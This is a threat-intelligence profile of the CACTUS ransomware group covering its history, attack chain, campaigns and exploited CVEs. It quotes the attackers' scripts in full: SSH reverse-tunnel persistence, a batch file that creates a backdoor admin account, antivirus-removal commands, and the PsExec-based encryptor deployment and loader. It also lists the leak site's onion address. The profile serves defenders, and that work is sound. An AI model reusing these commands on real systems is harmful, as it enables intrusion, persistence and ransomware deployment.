## History 

The CACTUS ransomware is said to have emerged around March 2023. The group became known for exploiting vulnerabilities to gain initial access and maintain a presence within the organization's infrastructure.

There is little known information about the ransomware group, except that it emerged on the mentioned date and, following encryption, a text file named 'cAcTuS.readme.txt' would be created. Additionally, encrypted files were altered to the '.cts1' extension, and data exfiltration and victim extortion were conducted through the use of the service known as Tox.

As mentioned earlier, the ransomware especially exploits vulnerabilities in VPNs, also utilizing obfuscation techniques to conceal its activities, such as employing UPX and utilizing encryption algorithms like OpenSSL, AES OCB, ChaCha20_Poly1305, system reinitializations, and others.

DLS Onion: https://cactusbloguuodvqjmnzlwetjlpj6aggc6iocwhuupb47laukux7ckid.onion/

![image](https://github.com/crocodyli/ThreatActors-TTPs/assets/113185400/bc3f3613-8ede-4d4e-bc84-73c9348ee2b3)


## Ransomware Cactus Attack Chain

**INITIAL ACCESS**
For Initial Access, the ransomware group exploits known vulnerabilities in VPN devices, followed by the creation of an SSH backdoor that facilitates access for the actor and manages to persist within the organization's infrastructure.

In these invasions through vulnerable VPN devices, the actors exploited the use of VPN service accounts and then used the following command to set up an SSH server to maintain persistent access, using scheduled tasks. The scheduled task is named 'Updates Check Task' and runs every 5 minutes, executed as SYSTEM.

|     echo off   %programdata%\sshd\ssh-keygen -f %programdata%\sshd\config\id_rsa -t rsa -N   "" icacls %programdata%\sshd\config\keys\id_rsa /inheritance:r   icacls %programdata%\sshd\config\keys\id_rsa /grant:r   "%username%":"(R)" icacls   %programdata%\sshd\config\id_rsa /inheritance:r icacls   %programdata%\sshd\config\id_rsa /grant:r   "%username%":"(R)" schtasks.exe /create /sc minute /mo 1   /tn "SSH Server" /rl highest /np /tr "%programdata%\sshd\sshd.exe   -f %programdata%\sshd\config\sshd_config" schtasks.exe /create /sc   minute /mo 1 /tn "SSH Key Exchange" /rl highest /np /tr   "%programdata%\sshd\ssh.exe -i %programdata%\sshd\config\keys\id_rsa -N   -R 22682:127.0.0.1:2222 -o StrictHostKeyChecking=no -o ServerAliveInterval=60   -o ServerAliveCountMax=15 root@    |
|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|

**DISCOVERY**
Within the organization's network, the threat actor initiates the Discovery process, using the "SoftPerfect Network Scanner (netscan)" software to identify other types of devices.

Additionally, some PowerShell commands are executed for network enumeration, such as running a command to view Windows events with ID 4624 to identify user accounts, and conducting pings on other remote devices.

|     >>> Get-ADComputer   -Filter * -Properties * \| select ipv4Address > ips.txt     >>> Get-ADUser -   Filter * -Properties * > users.txt     >>> Get-Eventlog   -LogName Security -InstanceID 4624 \| Sort-Object -Property Time -Descending \|   Select-Object -Property Time -ExpandProperty Message >   c:\users\public\ad.txt     >>> ping    |
|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|

The response of these commands is saved in a text file on the machine and used later by the ransomware payload for encryption. Another file that can be used by the actors is known as "PSnmap.ps1," which would be similar to NMAP for PowerShell, and is executed to identify other assets on the network.

**PERSISTENCE**
Next, aiming to implement persistence in the organization's environment, the threat actor creates several methods of remote access. Among them, the use of legitimate tools such as Splashtop, AnyDesk, and SuperOps RMM was identified, along with the use of Cobalt Strike and Chisel (a SOCKS5 proxy tool).

The Chisel tool is used to provide covert communications to the threat actor's C2, by tunneling traffic through firewalls, thereby allowing the download of additional scripts and tools.

**PRIVILEGE ESCALATION**
To obtain the necessary credentials for execution and lateral movement, the threat actor typically tries to extract credentials from users' web browsers and manually searches the disk for files containing passwords. The group may also attempt to extract credentials from LSASS to use them in privilege escalation. A batch script (bat) is executed and used to add privileged accounts to remote terminals.

|     @echo off     net user Adm1nBac   P@ssW0dDP@ssW /add     net user Adm1nBac   /active:yes     net localgroup   Administrators Adm1nBac /add     bcdedit /set {default}   safeboot minimal     reg add   "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v   LegalNoticeText /t REG_SZ /d "" /f     reg add   "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v   LegalNoticeCaption /t REG_SZ /d "" /f     reg add   "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v   LegalNoticeText /t REG_SZ /d "" /f     reg add   "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v   LegalNoticeCaption /t REG_SZ /d "" /f     reg add   "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v   AutoAdminLogon /t REG_SZ /d 1 /f     reg add   "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v   DefaultUserName /t REG_SZ /d Adm1nBac /f     reg add   "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v   DefaultPassword /t REG_SZ /d P@ssW0dDP@ssW /f     reg add   "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v   AutoLogonCount /t REG_DWORD /d 1 /f     reg add   "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v   "*!test" /t REG_SZ /d "C:\windows\f2.bat" /f     shutdown -r -f -t 5     del "%~f0"    |
|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|

After the threat actor manages to establish the level of access, they execute a batch script (bat) that utilizes msiexec to uninstall common antivirus software through the software's GUID.

|     TASKKILL /F /IM msiexec.exe     msiexec.exe /x   {3E8909A1-55FD-46C4-8FC0-604313331AA2} /QN /norestart     msiexec.exe /x   {36E5BC45-019B-49A5-A722-E64FF83AE375} /QN /norestart     msiexec.exe /x   {9B5749A2-35AE-435C-BF34-51884160AB09} /QN /norestart     <…snip…>     c:\windows\BEST_uninstallTool.exe   /bdparams     del "%~f0"    |
|---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|

**LATERAL MOVEMENT**
Lateral movement was performed using valid accounts or those created through Remote Desktop Protocol (RDP) connections. Additionally, the Super Ops tool was also utilized for this purpose.

**EXECUTION**
As identified in other ransomware operations, this group also attempts data exfiltration, aiming for double extortion of the victim. For this purpose, the group used the Rclone tool to automate data exfiltration.

After the data exfiltration, the threat actor utilizes a script previously identified in BlackBasta ransomware operations, known as "TotalExec.ps1". This script uses PsExec to automate the deployment of the encryptor, in this case, the f1.bat script.

|     powershell.exe -ex bypass   -nop -file totalexec.ps1 -CMD c:\windows\f1.bat -ACC .\admin1234 -SECR   Pa$$w0rd12321 -EXE f1.bat,f2.bat,.7z,7.exe -LIST ips.txt -JOBS 10 -CHUNK 10   -WAIT 5    |
|---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|

This script is deployed initially to create an administrator user account, which then adds a second script called f2.bat to be automatically executed at the machine level before restarting the device. The f2.bat script utilizes the 7zip tool to extract the ransomware binary and then executes it.

|     @echo off     SETLOCAL EnableExtensions     bcdedit /deletevalue   {default} safeboot     C:\Windows\7.exe x   C:\Windows\.7z -p1234 -o"C:\Windows"     del C:\Windows\7.exe     del C:\Windows\.7z     C:\Windows\.exe -i     SET EXE=.exe     :Running     FOR /F %%x IN ('tasklist /NH   /FI "IMAGENAME eq %EXE%"') DO IF NOT %%x == %EXE% (       ECHO %EXE% is Not Running       GOTO notRunning     ) ELSE (       ECHO %EXE is running     timeout /t 10      GOTO Running     )     ...     :notRunning       ECHO %EXE% is Not Running     del C:\Windows\.exe     shutdown -r -t 5 -c   "Computer Will Now Restart In NORMAL MODE..."     del "%~f0"    |
|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|

The binary uses the victim's individual ID for negotiations, utilizing a regular expression (regex). Additionally, the executable is compressed with UPX and has 3 main execution modes controlled by command-line arguments.

The "-s" argument focuses on maintaining persistence, where it will self-copy to C:\ProgramData\<victim ID>.exe. The ransomware then creates a configuration file encoded in hexadecimal and packed with unwanted data in C:\ProgramData\ntuser.dat, containing the path to the original .exe.

After the file creation, the ransomware creates and executes a scheduled task that runs the command C:\ProgramData\<victim ID>.exe -r.

After encryption, a text file regarding the ransom note is created on the victim's device, containing the following content:

![image](https://github.com/crocodyli/ThreatActors-TTPs/assets/113185400/a4366658-ea24-4179-a738-4115af212482)


**IDENTIFIED CAMPAIGNS**

In December 2023, Microsoft warned that the actors behind the Ransomware Cactus were using malvertising as a method of infecting victims.

According to Microsoft, a threat actor known as STORM-0216 received transfers from Qakbot operators, and as a result, began using different malware to gain initial access after the Qakbot operation was removed. One of the observed campaigns, known as Danabot, was involved in collecting user credentials and other information, sending the data to the C2. This activity, tracked by Microsoft, led the threat actor to use Ransomware Cactus to encrypt the data, linking the use of Danabot through malvertising techniques.

![image](https://github.com/crocodyli/ThreatActors-TTPs/assets/113185400/327e49f2-bb83-4ce9-a61b-d40e06567a3b)

**EXPLOITED CVEs**

Several campaigns utilized by Ransomware Cactus were observed, such as exploiting security flaws in the cloud analytics and business intelligence platform known as Qlik Sense.

The exploitation was identified by researchers at Arctic Wolf, who stated that the group was likely exploiting the vulnerabilities:

- CVE-2023-41265, with a score of 9.9.
- CVE-2023-41266, with a score of 6.5.
- CVE-2023-48365, with a score of 9.9.

It is worth mentioning that CVE-2023-48365 is the result of an incomplete patch for CVE-2023-41265, which, along with CVE-2023-41266, was disclosed by Praetorian at the end of August 2023.



## References: 
https://www.kroll.com/en/insights/publications/cyber/cactus-ransomware-prickly-new-variant-evades-detection

https://socradar.io/dark-web-profile-cactus-ransomware/

https://securityscorecard.com/wp-content/uploads/2024/01/Whitepaper-Cactus-Ransomware.pdf

https://thehackernews.com/2023/11/cactus-ransomware-exploits-qlik-sense.html






































